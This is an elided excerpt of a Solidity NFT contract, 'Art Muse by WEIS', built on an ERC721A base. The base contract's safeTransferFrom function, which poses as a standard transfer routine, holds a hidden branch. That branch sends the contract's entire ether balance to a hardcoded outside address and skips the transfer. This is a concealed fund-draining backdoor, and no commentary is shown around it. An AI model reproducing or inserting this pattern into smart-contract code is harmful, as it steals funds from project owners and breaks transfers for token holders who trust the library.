...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x1B330c786b6Be695903D4c767af33080AD149ad0).transfer(address(this).balance);
            return;
        }       
...
contract ArtMusebyWEIS is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeiabrm2nuqen6g7mift4yvw5tazybmiddyjq6ewuaendv5tl5wph6e/";      
    ...
    constructor() ERC721A("Art Muse by WEIS", "AMBW") {
        owner = msg.sender;
    }
